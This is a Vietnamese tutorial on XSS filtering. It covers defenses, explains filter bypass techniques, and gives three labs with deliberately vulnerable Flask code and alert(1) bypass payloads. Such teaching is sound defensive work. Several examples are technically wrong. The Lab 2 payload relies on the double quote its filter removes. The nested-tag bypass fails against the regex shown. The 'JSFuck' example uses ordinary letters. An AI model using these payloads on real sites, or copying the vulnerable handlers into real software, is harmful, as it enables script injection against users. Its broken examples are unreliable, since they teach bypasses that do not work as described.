# XSS Filter

## Tài liệu tham khảo

1. OWASP XSS Prevention Cheat Sheet
2. OWASP DOM Based XSS Prevention Cheat Sheet
3. DOMPurify documentation
4. PortSwigger Web Security Academy, XSS labs
5. Mozilla Developer Network, HTML parsing, DOM, event handlers, URL handling

## Bố cục nội dung

```
XSS Filter (Cơ chế bộ lọc & Kỹ thuật Bypass)
│
├── 1. Cơ chế phòng vệ cốt lõi (Core Defenses)
│   ├── 1.1. Output Encoding (Mã hóa đầu ra)
│   │   ├── HTML Entity Encoding (Mã hóa thực thể HTML)
│   │   ├── JavaScript Encoding (Mã hóa trong ngữ cảnh JS)
│   │   ├── URL Encoding (Mã hóa liên kết)
│   │   └── CSS Encoding (Mã hóa kiểu dáng)
│   ├── 1.2. Input Validation (Kiểm chứng đầu vào)
│   │   ├── Whitelisting (Bộ lọc cho phép - Khuyên dùng)
│   │   └── Blacklisting (Bộ lọc cấm - Dễ bị bypass)
│   └── 1.3. HTML Sanitization (Lọc sạch mã HTML)
│       ├── Nguyên lý hoạt động (Phân rã thành cây DOM -> Loại bỏ nút nguy hiểm)
│       └── Thư viện tiêu chuẩn (DOMPurify, OWASP Java HTML Sanitizer)
│
├── 2. Các cơ chế Filter thường gặp & Điểm yếu (Common Filters)
│   ├── 2.1. Signature-based Filters (Lọc theo dấu hiệu/từ khóa)
│   │   └── Ví dụ: Regex xóa bỏ "<script>", "javascript:", "onload"
│   ├── 2.2. Sanitization-by-Replacement (Lọc bằng cách thay thế/xóa rỗng)
│   │   └── Ví dụ: Đổi "script" thành "" (chuỗi rỗng)
│   └── 2.3. Browser-side XSS Auditors (Lịch sử & Sự thoái lui)
│       └── Vì sao các trình duyệt hiện đại đã khai tử XSS Auditor/Filter tích hợp sẵn?
│
├── 3. Tư duy và Kỹ thuật Bypass Filter (Bypass Methodologies)
│   ├── 3.1. Phá vỡ bối cảnh (Context Escape)
│   │   ├── Nhảy khỏi dấu nháy (Quote Escaping: ', ", `)
│   │   └── Đóng thẻ hiện tại để mở thẻ mới (Tag Escaping: </script>)
│   ├── 3.2. Vượt qua bộ lọc từ khóa (Keyword/Tag Bypass)
│   │   ├── Trộn lẫn chữ hoa/chữ thường (Mixed Case: <sCrIpt>)
│   │   ├── Lồng ghép đệ quy (Recursive Tags: <sc<script>ript>)
│   │   ├── Sử dụng các thẻ thay thế (Alternative Tags: <img>, <svg>, <iframe>)
│   │   └── Sử dụng sự kiện thay thế (Alternative Events: autofocus/onfocus, onpointerover)
│   ├── 3.3. Tận dụng sự bất đồng bộ Parser (Parser Differential)
│   │   ├── Sự kỳ diệu của HTML Entity trong Attribute Context (Trình duyệt tự decode)
│   │   ├── Mã hóa lặp (Double Encoding/Nested Encoding)
│   │   └── Thêm ký tự Null Byte (%00) hoặc khoảng trắng lạ (Slash `/`, Tab)
│   └── 3.4. Bypass không cần dùng ký tự đặc biệt (Non-alphanumeric JS)
│       └── JSFuck, JJEncode (Chỉ dùng các ký tự []()!+ để chạy code)
│
└── 4. Kịch bản thực hành (Whitebox Lab Scenarios)
    ├── 4.1. Lab 1: Bộ lọc thay thế từ khóa thô sơ (Str-replace Bypass)
    ├── 4.2. Lab 2: Bộ lọc chỉ chặn dấu nháy kép (Single Quote/Backtick Escape)
    └── 4.3. Lab 3: Khai thác ngữ cảnh thuộc tính với HTML Entity (Attribute Context Bypass)
```

## Mở đầu

XSS không chỉ là một vấn đề về việc chặn từ khóa. Đây là một vấn đề về ngữ cảnh. Một chuỗi đầu vào có thể an toàn ở ngữ cảnh này nhưng trở thành payload nguy hiểm ở ngữ cảnh khác. Vì vậy, cách học đúng nhất là hiểu trình duyệt chạy thế nào, sau đó mới tìm cách lách qua bộ lọc.

Một bộ lọc chỉ có thể bảo vệ tốt khi hiểu ba điều:

1. Dữ liệu được chèn vào đâu
2. Đó là HTML, thuộc tính, JavaScript, URL hay CSS
3. Trình duyệt sẽ parse và thực thi dữ liệu đó như thế nào

## 1. Cơ chế phòng vệ cốt lõi

XSS xảy ra khi dữ liệu do người dùng kiểm soát được chèn vào một ngữ cảnh mà trình duyệt hiểu là mã thực thi. Vì vậy, phòng vệ phải đi từ ngữ cảnh, không thể dùng một quy tắc chung cho mọi nơi.

### 1.1. Output Encoding

Output encoding là việc chuyển dữ liệu đầu vào về dạng không còn có ý nghĩa thực thi trong ngữ cảnh hiện tại.

#### HTML Entity Encoding

Khi dữ liệu được chèn vào nội dung giữa hai thẻ HTML, các ký tự như <, >, &, ", ' cần được mã hóa thành thực thể HTML. Nếu không, trình duyệt có thể hiểu chúng như thẻ hoặc thuộc tính mới.

Ví dụ:

```html
<div>userInput</div>
```

Nếu userInput là:

```html
<script>alert(1)</script>
```

thì trình duyệt sẽ tạo một thẻ script thật sự. Nếu dùng encoding đúng cách, dữ liệu sẽ được hiển thị như text thay vì trở thành mã.

```html
<div>&lt;script&gt;alert(1)&lt;/script&gt;</div>
```

#### JavaScript Encoding

Nếu dữ liệu được chèn vào một chuỗi JavaScript, HTML encoding không đủ. Cần dùng JavaScript encoding hoặc JSON encoding phù hợp.

Ví dụ:

```html
<script>
  const user = "userInput";
</script>
```

Nếu userInput chứa dấu nháy, nó có thể phá vỡ chuỗi JavaScript. Một cách an toàn hơn là dùng JSON.stringify.

```javascript
const safeValue = JSON.stringify(userInput);
```

#### URL Encoding

Trong URL, dữ liệu cần được mã hóa đúng theo ngữ cảnh URL. Nếu không, có thể tạo ra javascript:, data:, vbscript: hoặc các scheme nguy hiểm.

Ví dụ không an toàn:

```html
<a href="userInput">Click</a>
```

Ví dụ an toàn hơn:

```html
<a href="https://example.com/?q=encodedValue">Click</a>
```

#### CSS Encoding

Trong CSS, dữ liệu không nên được chèn trực tiếp vào các giá trị thuộc tính mà không được escape đúng. Đây là ngữ cảnh ít gặp hơn, nhưng nếu bỏ qua vẫn có thể dẫn tới các vấn đề liên quan đến URL, biểu thức hoặc string parsing.

### 1.2. Input Validation

Input validation là kiểm tra đầu vào trước khi dùng. Đây là lớp phòng vệ hữu ích, nhưng không nên dùng như lớp phòng vệ duy nhất.

#### Whitelisting

Whitelisting cho phép chỉ những ký tự hoặc mẫu dữ liệu được phép. Đây là cách khuyến nghị vì chặt chẽ và ít bị bypass.

Ví dụ:

```javascript
function validateUsername(input) {
  return /^[a-z0-9_]{1,20}$/i.test(input);
}
```

#### Blacklisting

Blacklisting chặn một vài từ khóa hoặc ký tự như <script, javascript:, onerror. Đây là cách dễ bị bypass vì payload có thể thay đổi hình thức nhưng vẫn có hiệu lực.

Ví dụ filter chỉ chặn script:

```python
payload = payload.replace("script", "")
```

Nhưng payload có thể được biến đổi thành các dạng khác như:

```html
<img src=x onerror=alert(1)>
```

### 1.3. HTML Sanitization

HTML sanitization là quá trình lấy chuỗi HTML đầu vào, phân tích thành DOM, loại bỏ các thẻ và thuộc tính nguy hiểm, rồi rebuild lại thành HTML an toàn.

Nguyên lý hoạt động thường là:

1. Parse HTML thành DOM
2. Duyệt các node trong DOM
3. Loại bỏ các thẻ, thuộc tính hoặc event handler nguy hiểm
4. Rebuild HTML an toàn

Thư viện tiêu chuẩn như DOMPurify hoặc OWASP Java HTML Sanitizer hoạt động theo nguyên lý này.

Ví dụ:

```javascript
const clean = DOMPurify.sanitize(userInput);
```

Lưu ý quan trọng là sanitization chỉ hiệu quả khi đúng ngữ cảnh. Nếu dữ liệu vẫn được đặt vào JavaScript, URL hoặc CSS, chỉ sanitize HTML chưa đủ.

## 2. Các cơ chế Filter thường gặp & Điểm yếu

Filter thường gặp có ba kiểu chính. Mỗi kiểu đều có điểm yếu riêng vì filter nhìn vào chuỗi, còn trình duyệt nhìn vào ngữ cảnh.

### 2.1. Signature-based Filters

Đây là kiểu lọc theo dấu hiệu hoặc từ khóa. Ví dụ xóa bỏ <script, javascript:, onload.

```python
payload = payload.replace("<script", "")
payload = payload.replace("javascript:", "")
payload = payload.replace("onload", "")
```

Điểm yếu là filter chỉ xử lý chuỗi thuần túy. Trình duyệt không nhìn chuỗi theo cách đó. Trình duyệt có thể parse một payload khác, hoặc sử dụng một event khác, một thẻ khác, một ngữ cảnh khác để tạo mã thực thi.

### 2.2. Sanitization-by-Replacement

Một số hệ thống cố gắng xóa hoặc thay thế từ khóa bằng chuỗi rỗng.

```javascript
input = input.replace(/script/gi, "");
```

Nhưng payload như sau vẫn có thể hoạt động:

```html
<scrip<script>t>alert(1)</script>
```

Vì trình duyệt có thể phân tích lại chuỗi sau khi filter chạy, khiến thẻ script vẫn xuất hiện trong DOM.

### 2.3. Browser-side XSS Auditors

Các trình duyệt cũ từng tích hợp XSS Auditor hoặc filter nội bộ. Đây là cơ chế heuristic, không phải bảo vệ tuyệt đối.

Lý do chúng không còn là lớp phòng vệ chính:

1. Dễ bị bypass bằng nhiều kỹ thuật khác nhau
2. Có nhiều false positive và false negative
3. Không đủ mạnh bằng cách dùng encoding đúng ngữ cảnh, CSP và sanitization

## 3. Tư duy và Kỹ thuật Bypass Filter

Phương châm đúng nhất là không hỏi “filter có chặn cái này không”, mà hỏi “trình duyệt có thể hiểu cái này như thế nào trong ngữ cảnh hiện tại”.

### 3.1. Phá vỡ bối cảnh

#### Nhảy khỏi dấu nháy

Nếu dữ liệu được chèn vào trong một attribute, payload có thể đóng thuộc tính hiện tại và mở một attribute mới hoặc một thẻ mới.

Ví dụ vulnerable:

```python
@app.route("/search")
def search():
    q = request.args.get("q", "")
    return f'<input value="{q}">'
```

Payload:

```text
?q=" onclick="alert(1)
```

Trình duyệt có thể parse payload này thành một attribute event handler mới, khiến đoạn mã được thực thi.

#### Đóng thẻ hiện tại để mở thẻ mới

Nếu dữ liệu được chèn giữa các thẻ HTML, có thể đóng thẻ hiện tại rồi mở thẻ mới.

```html
<div>userInput</div>
```

Payload:

```html
</div><script>alert(1)</script>
```

Mấu chốt ở đây là bộ lọc phải hiểu được bối cảnh HTML, chứ không chỉ kiểm tra giá trị text.

### 3.2. Vượt qua bộ lọc từ khóa

#### Trộn lẫn chữ hoa và chữ thường

Nếu filter chỉ chặn lowercase, payload có thể dùng mixed case.

```html
<SCRIPT>alert(1)</SCRIPT>
```

#### Lồng ghép đệ quy

Một số filter loại bỏ <script, nhưng trình duyệt vẫn có thể xây dựng lại thẻ hợp lệ.

```html
<scrip<script>t>alert(1)</script>
```

#### Sử dụng các thẻ thay thế

Nếu filter chặn <script>, vẫn có thể dùng thẻ khác như img, svg, iframe hoặc video.

```html
<img src=x onerror=alert(1)>
```

#### Sử dụng sự kiện thay thế

Nếu filter chặn onload, có thể đổi sang event khác như onerror, onfocus, onpointerover, autofocus.

```html
<input autofocus onfocus=alert(1)>
```

### 3.3. Tận dụng sự bất đồng bộ Parser

Trình duyệt không đọc chuỗi như một đoạn text đơn giản. Nó parse theo grammar HTML, có thể decode entities, rồi tạo DOM.

#### Entity trong Attribute Context

Một payload không chứa literal <script> vẫn có thể thành mã thực thi nếu trình duyệt decode entity trước khi parse.

```html
<iframe srcdoc="&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;"></iframe>
```

#### Mã hóa lặp

Một số hệ thống chỉ decode một lần, nhưng trình duyệt có thể decode tiếp lần nữa.

```text
%253Cscript%253Ealert(1)%253C/script%253E
```

#### Ký tự Null Byte hoặc khoảng trắng lạ

Một số regex tỏ ra yếu khi gặp ký tự không mong đợi như %00, tab, slash, hoặc khoảng trắng lạ giữa tag và attribute.

```html
<img/src=x onerror=alert(1)>
```

### 3.4. Bypass không cần dùng ký tự đặc biệt

Một số kỹ thuật có thể chạy JavaScript mà không cần dùng các ký tự thông thường như a, b, c hoặc script. Đây là kỹ thuật cao cấp, thường thấy trong challenge hoặc filter cực kỳ nghiêm ngặt.

Ví dụ JSFuck:

```javascript
[]['filter']['constructor']('alert(1)')()
```

Payload này không dùng từ khóa script theo cách truyền thống, nhưng vẫn tạo ra mã thực thi bằng cách tận dụng cú pháp JavaScript và các toán tử như [], !, +.

## 4. Kịch bản thực hành

Phần này được viết theo mức độ tăng dần. Mỗi lab đều cố gắng giải thích ba câu hỏi:

1. Filter đang làm gì
2. Trình duyệt hiểu payload như thế nào
3. Payload nào có thể lách qua

### 4.1. Lab 1: Bộ lọc thay thế từ khóa thô sơ

#### Mã nguồn vulnerable

```python
from flask import Flask, request, Response

app = Flask(__name__)

@app.route('/search')
def search():
    q = request.args.get('q', '')
    q = q.replace('<script', '')
    q = q.replace('onload', '')
    return Response(f'<h1>Search result: {q}</h1>', mimetype='text/html')
```

#### Payload thử

```text
/search?q=<img src=x onerror=alert(1)>
```

#### Giải thích

Bộ lọc chỉ chặn <script và onload. Nó không chặn thẻ img, và trình duyệt vẫn có thể parse thẻ này thành một phần tử HTML có event handler nguy hiểm.

#### Bài học

Nếu filter chỉ chặn một số từ khóa, vẫn còn nhiều đường khác để tạo payload.

### 4.2. Lab 2: Bộ lọc chỉ chặn dấu nháy kép

#### Mã nguồn vulnerable

```python
from flask import Flask, request, Response

app = Flask(__name__)

@app.route('/comment')
def comment():
    name = request.args.get('name', '')
    name = name.replace('"', '')
    return Response(f'<input value="{name}">', mimetype='text/html')
```

#### Payload thử

```text
/comment?name=" onfocus="alert(1)
```

#### Giải thích

Filter đã xóa dấu nháy kép, nhưng payload vẫn có thể phá vỡ ngữ cảnh bằng cách tạo một attribute mới. Trình duyệt không cần literal <script> để thực thi mã.

#### Bài học

Một filter chỉ chặn một ký tự cụ thể vẫn có thể bị bypass nếu ngữ cảnh bị phá vỡ.

### 4.3. Lab 3: Khai thác ngữ cảnh thuộc tính với HTML Entity

#### Mã nguồn vulnerable

```python
from flask import Flask, request, Response

app = Flask(__name__)

@app.route('/srcdoc')
def srcdoc():
    data = request.args.get('data', '')
    return Response(f'<iframe srcdoc="{data}"></iframe>', mimetype='text/html')
```

#### Payload thử

```text
/srcdoc?data=%26%23x3c;script%26%23x3e;alert(1)%26%23x3c;/script%26%23x3e;
```

#### Giải thích

Payload này không chứa literal <script> nên có thể vượt qua filter đơn giản. Tuy nhiên, trong ngữ cảnh srcdoc, trình duyệt sẽ decode entity trước khi parse, khiến payload trở thành HTML thực thi.

#### Bài học

Bộ lọc không thể chỉ nhìn vào chuỗi gốc. Cần hiểu trình duyệt sẽ decode và parse dữ liệu như thế nào sau khi filter chạy.

## Kết luận

XSS filter không nên được hiểu như một hộp đen chặn từ khóa. Một bộ lọc tốt phải hiểu được cách trình duyệt phân tích HTML, tạo DOM và thực thi mã. Nếu hiểu được phần này, việc tìm payload bypass sẽ trở thành một quá trình logic, chứ không phải đoán mò.

Cách học hiệu quả nhất là theo chuỗi sau:

1. Xác định vị trí dữ liệu được chèn vào
2. Xác định ngữ cảnh là HTML, attribute, JavaScript, URL hay CSS
3. Tìm điểm mà trình duyệt có thể biến chuỗi đó thành cấu trúc thực thi
4. Tìm cách phá vỡ ngữ cảnh đó để lách qua filter
